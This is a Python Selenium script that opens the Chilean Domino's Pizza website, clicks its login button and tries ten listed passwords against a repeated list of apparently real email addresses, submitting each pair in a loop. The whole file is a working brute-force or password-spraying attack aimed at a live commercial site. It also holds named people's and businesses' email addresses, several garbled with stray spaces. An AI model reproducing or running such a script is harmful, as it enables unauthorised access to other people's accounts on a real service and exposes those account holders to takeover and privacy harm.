import string, random, time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

driver_path = '/usr/local/bin/chromedriver'

if __name__ == "__main__":
    #Variables
    options = webdriver.ChromeOptions()
    options.add_argument('--start-maximized')
    options.add_argument('--disable-extensions')

    driver = webdriver.Chrome(driver_path, chrome_options=options)
    users_mails=["abelito.colocolo@gmail.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com","    @outlook.cl",
    "abelito.colocolo@gmail.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com"," @outlook.cl","lperez@dharmausaha.cl","raulautotrans@gmail.com","metropolisinternet.com","sherrera@vgi.cl","pvaldivia@enruta.cl","pvaldivia@enruta.cl","reikyusui@hotmail.com","contacto@demandados.cl","c.petersen@luminex.cl","reikyusui@hotmail.com","abelito.colocolo@gmail.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com","  @outlook.cl",
    "abelito.colocolo@gmail.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com"," @outlook.cl","lperez@dharmausaha.cl","raulautotrans@gmail.com","metropolisinternet.com","sherrera@vgi.cl","pvaldivia@enruta.cl","pvaldivia@enruta.cl","reikyusui@hotmail.com","contacto@demandados.cl","c.petersen@luminex.cl","reikyusui@hotmail.com","abelito.colocolo@gmail.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com","  @outlook.cl",
    "abelito.colocolo@gmail.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com"," @outlook.cl","lperez@dharmausaha.cl","raulautotrans@gmail.com","metropolisinternet.com","sherrera@vgi.cl","pvaldivia@enruta.cl","pvaldivia@enruta.cl","reikyusui@hotmail.com","contacto@demandados.cl","c.petersen@luminex.cl","reikyusui@hotmail.com","abelito.colocolo@gmail.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com","  @outlook.cl",
    "abelito.colocolo@gmail.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com"," @outlook.cl","lperez@dharmausaha.cl","raulautotrans@gmail.com","metropolisinternet.com","sherrera@vgi.cl","pvaldivia@enruta.cl","pvaldivia@enruta.cl","reikyusui@hotmail.com","contacto@demandados.cl","c.petersen@luminex.cl","reikyusui@hotmail.com","abelito.c   il.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com","  @outlook.cl",
    "abelito.c  olocolo@gmail.com","baullozaabel@gmail.com","emilo@gmail.com","12345@gmail.com","   @outlook.cl","lperez@dharmausaha.cl","raulautotrans@gmail.com","metropolisinternet.com","sherrera@v gi.cl","pvaldivia@enruta.cl","pvaldivia@enruta.cl","reikyusui@hotmail.com","contacto@demandados.cl","c.petersen@luminex.cl","abelito.colocolo@gmail.com"]

    password=["5TFOBHC3KK","mvc141455","pq3e5r4ty3d670","WwX8Ps4bIq","kxxahypi","cnnzadlb","5cmJAkpcyv","lgkmuwji","sgpaqvbe","dominospizza"]

    #Iniciar interfaz 
    driver.set_window_position(1000,0)
    driver.maximize_window()
    time.sleep(1)

    #Inicializamos el navegador
    driver.get('https://www.dominospizza.cl/')
    time.sleep(3)
    
    driver.find_element(By.ID,"iniciaSesion").click()
    time.sleep(3)

    for i in password:
       for j in users_mails: 
            #Mails
            mail = driver.find_element(By.ID, "user_email")
            time.sleep(1)
            mail.clear()
            mail.send_keys(j)
            time.sleep(1)
            #Password
            passw = driver.find_element(By.ID, "user_password")
            passw.clear()
            time.sleep(1)
            passw.send_keys(i)
            time.sleep(1)
            driver.find_element(By.XPATH, "//*[@id='submit-login']").click()
    driver.close()
